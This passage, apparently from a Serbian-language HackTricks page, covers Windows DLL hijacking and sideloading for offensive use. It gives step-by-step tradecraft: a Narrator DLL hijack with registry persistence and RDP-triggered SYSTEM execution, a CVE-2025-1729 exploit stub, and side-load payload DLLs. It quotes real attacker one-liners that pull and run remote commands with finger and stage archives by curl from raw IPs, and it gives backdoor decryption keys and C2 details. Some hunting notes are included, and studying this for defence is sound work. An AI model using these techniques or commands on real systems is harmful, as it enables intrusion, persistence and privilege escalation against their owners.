- Legacy putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji DLL datoteka pod kontrolom napadača sa dozvolom upisivanja, ona se učitava i `DllMain(DLL_PROCESS_ATTACH)` se izvršava. Exporti nisu potrebni.

Otkrivanje pomoću Procmon-a
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivan hijack će govoriti/istaći UI. Da biste ostali neprimetni, pri attach-u enumerišite Narrator thread-ove, otvorite glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte ga pomoću `SuspendThread`; nastavite u sopstvenom thread-u. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Trigger i persistence putem Accessibility konfiguracije
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Uz prethodno navedeno, pokretanje Narrator-a učitava ubačeni DLL. Na secure desktop-u (ekranu za prijavljivanje), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM execution (lateral movement)
- Dozvolite classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se putem RDP-a sa hostom, na ekranu za prijavljivanje pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje se zaustavlja kada se RDP session zatvori—izvršite inject/migrate bez odlaganja.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni Accessibility Tool (AT) registry entry (npr. CursorIndicator), izmeniti ga tako da pokazuje na proizvoljni binary/DLL, importovati ga, a zatim postaviti `configuration` na ime tog AT-a. Na ovaj način se proizvoljno izvršavanje posreduje kroz Accessibility framework.

Napomene
- Upisivanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Sva payload logika može biti smeštena u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu-u (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, koji se nalazi u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` pokreće se svakog dana u 9:30 u kontekstu trenutno prijavljenog user-a.
- **Dozvole direktorijuma**: `CREATOR OWNER` ima dozvolu za upis, što lokalnim user-ima omogućava da ubace proizvoljne fajlove.
- **Ponašanje DLL pretrage**: Pokušava da učita `hostfxr.dll` prvo iz svog working directory-ja i beleži "NAME NOT FOUND" ako DLL nedostaje, što ukazuje na prioritet lokalne pretrage direktorijuma.

### Implementacija exploita

Napadač može postaviti zlonamerni `hostfxr.dll` stub u isti direktorijum, iskorišćavajući DLL koji nedostaje za postizanje code execution-a u kontekstu user-a:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se scheduled task pokrene u 9:30 ujutru u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se task izvrši, malicious DLL se pokreće u sesiji administratora sa medium integritetom.
4. Kombinujte standardne UAC bypass tehnike da biste prešli sa medium integriteta na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading putem Signed Host-a (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loadingom kako bi izvršili payloads u okviru pouzdanog, potpisanog procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se nečujno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript action), rekonstruišući sledeću fazu iz embedded resources.
- Dropper upisuje legitimni, potpisani EXE i malicious DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + wsc.dll pod kontrolom napadača).
- Kada se potpisani EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz working directory-ja, izvršavajući code napadača u okviru potpisanog parent procesa (ATT&CK T1574.001).

MSI analiza (na šta treba obratiti pažnju)
- CustomAction tabela:
- Potražite unose koji pokreću izvršne fajlove ili VBScript. Sumnjiv obrazac: LaunchApplication koji izvršava embedded fajl u pozadini.
- U Orca (Microsoft Orca.exe), pregledajte CustomAction, InstallExecuteSequence i Binary tabele.
- Embedded/split payloads u MSI CAB-u:
- Administrativna ekstrakcija: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Potražite više malih fragmenata koje VBScript CustomAction spaja i dešifruje. Uobičajeni tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktični sideloading sa wsc_proxy.exe
- Smestite ova dva fajla u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports originalnoj biblioteci, dok payload pokrećete u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za export, koristite proxying framework (npr. DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na DLL name resolution host binara. Ako host koristi absolute paths ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može biti neuspešan.
- KnownDLLs, SxS i forwarded exports mogu uticati na redosled prioriteta i moraju se uzeti u obzir pri izboru host binara i export seta.

## Potpisane triade + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon postavlja ShadowPad koristeći **three-file triad** kako bi se uklopio u legitimni software, uz zadržavanje core payload-a encrypted na disku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – zloupotrebljavaju se vendori kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers preimenuju executable tako da izgleda kao Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje validan.
2. **Malicious loader DLL** – postavlja se pored EXE-a sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskovan pomoću ScatterBrain framework-a; njegov jedini zadatak je da pronađe encrypted blob, decrypt-uje ga i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping-a decrypted payload-a, loader briše TMP file kako bi uništio forensic evidence.

Tradecraft napomene:

* Preimenovanje signed EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava mu da se predstavi kao Windows binary, uz zadržavanje vendor signature-a, zato replicirajte naviku Ink Dragon-a da postavlja `conhost.exe`-looking binaries koji su zapravo AMD/NVIDIA utilities.
* Pošto executable ostaje trusted, većina allowlisting controls zahteva samo da vaš malicious DLL bude pored njega. Fokusirajte se na prilagođavanje loader DLL-a; signed parent obično može da se pokrene bez izmena.
* ShadowPad-ov decryptor očekuje da TMP blob bude pored loader-a i writable, kako bi mogao da isprazni file nakon mapping-a. Ostavite direktorijum writable dok se payload ne učita; kada je u memoriji, TMP file može bezbedno da se obriše radi OPSEC-a.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators kombinuju DLL sideloading sa LOLBAS-om, tako da je jedini custom artifact na disku malicious DLL pored trusted EXE-a:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell pokreće `cmd.exe /c`, preuzima commands sa Finger servera i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima TCP/79 text; `| cmd` izvršava server response, što operators-ima omogućava da server-side rotiraju second stage.

- **Built-in download/extract:** Preuzmite archive sa benign extension-om, raspakujte ga i stage-ujte sideload target i DLL u random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirects; `tar -xf` koristi Windows-ov built-in tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI-ja, tako da telemetry prikazuje CIM-created process dok on učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funkcioniše sa binaries koji preferiraju local DLLs (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) radi pod trusted name-om.

- **Hunting:** Upozorite na `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; to je neuobičajeno van admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavni Lotus Blossom intrusion zloupotrebio je trusted update chain za isporuku NSIS-packed dropper-a koji je stage-ovao DLL sideload i potpuno in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, postavlja preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` i encrypted blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE import-uje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga decrypt-uje pomoću custom LCG-based stream-a (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa temporary data i skače na njega.
- Da bi izbegao IAT, loader resolve-uje APIs hashovanjem export names pomoću **FNV-1a basis 0x811C9DC5 + prime 0x100019**, a zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi rezultate sa salted target hashes.

Main shellcode (Chrysalis)
- Decrypt-uje PE-like main module ponavljanjem add/XOR/sub operacija sa key-em `gQ2JR&9;` kroz five passes, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da završi import resolution.
- Reconstruct-uje DLL name strings u runtime-u pomoću per-character bit-rotate/XOR transforms, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi second resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaki export table u blokovima od 4 byte-a uz Murmur-style mixing i koristi `GetProcAddress` samo kao fallback ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar dropped `BluetoothService` file-a na **offset 0x30808** (size **0x980**) i RC4-decrypt-uje se pomoću key-a `qwhvb^435h&*7`, čime se otkrivaju C2 URL i User-Agent.
- Beacons grade dot-delimited host profile, dodaju tag `4Q` na početak, a zatim ga RC4-encrypt-uju key-em `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS-a. Responses se RC4-decrypt-uju i prosleđuju pomoću tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode kontrolišu CLI args: bez args = install persistence (service/Run key) koji pokazuje na `-i`; `-i` ponovo pokreće self sa `-k`; `-k` preskače install i pokreće payload.

Alternate loader observed
- Isti intrusion je postavio Tiny C Compiler i izvršio `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. Attacker-supplied C source sadržao je shellcode, koji je kompajliran i pokrenut in-memory bez upisivanja PE-a na disk. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova faza compile-and-run zasnovana na TCC-u učitala je `Wininet.dll` tokom izvršavanja i preuzela shellcode druge faze sa hardkodovanog URL-a, pružajući fleksibilan loader koji se predstavlja kao pokretanje compiler-a.

## Sideloading potpisanog hosta sa export proxying-om + host thread parking-om

Neki DLL sideloading lanci dodaju **stability engineering** kako bi legitimni host ostao aktivan dovoljno dugo da čisto učita naredne faze, umesto da se sruši nakon učitavanja malicioznog DLL-a.<sup>[[11]](#references)</sup>

Uočeni obrazac
- Postaviti pouzdani EXE pored malicioznog DLL-a koristeći očekivano ime dependency-ja, kao što je `version.dll`.
- Maliciozni DLL **proxy-uje svaki očekivani export** ka pravom sistemskom DLL-u (na primer `%SystemRoot%\\System32\\version.dll`), tako da resolution import-a i dalje uspeva, a host proces nastavlja da radi.
- Nakon učitavanja, maliciozni DLL **patch-uje entry point hosta** tako da glavna nit ulazi u beskonačnu `Sleep` petlju umesto da se završi ili izvršava code paths koji bi ugasili proces.
- Nova nit izvršava stvarni maliciozni rad: dešifruje ime ili putanju DLL-a naredne faze (RC4/XOR su uobičajeni), a zatim ga pokreće pomoću `LoadLibrary`.

Zašto je ovo važno
- Uobičajeni DLL proxying čuva API kompatibilnost, ali ne garantuje da će host ostati aktivan dovoljno dugo za naredne faze.
- Parkiranje glavne niti pomoću `Sleep(INFINITE)` jednostavan je način da potpisani proces ostane rezidentan dok loader obavlja dešifrovanje, staging ili network bootstrap u worker niti.
- Hunting koji traži samo sumnjiv `DllMain` može propustiti ovaj obrazac ako se zanimljivo ponašanje dešava nakon patch-ovanja entry point-a hosta i pokretanja sekundarne niti.

Minimalni workflow
1. Kopirati potpisani host EXE i utvrditi DLL koji učitava iz lokalnog direktorijuma.
2. Napraviti proxy DLL koji export-uje iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirati worker nit.
4. Iz te niti patch-ovati entry point hosta ili startnu rutinu glavne niti tako da se vrti u petlji na `Sleep`.
5. Dešifrovati ime/config DLL-a naredne faze i pozvati `LoadLibrary` ili izvršiti manual-map payload-a.

Defensive pivots
- Potpisani procesi koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog application direktorijuma umesto iz `System32`.
- Memory patch-evi na entry point-u procesa ubrzo nakon učitavanja image-a, naročito jump/call instrukcije preusmerene na `Sleep`/`SleepEx`.
- Niti koje kreira proxy DLL i koje odmah pozivaju `LoadLibrary` nad drugim DLL-om čije je ime dešifrovano.
- Full-export proxy DLL-ovi postavljeni pored vendor executable-a unutar writable staging direktorijuma kao što su `ProgramData`, `%TEMP%` ili putanje do raspakovanih arhiva.

## Reference

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)

{{#include ../../../banners/hacktricks-training.md}}
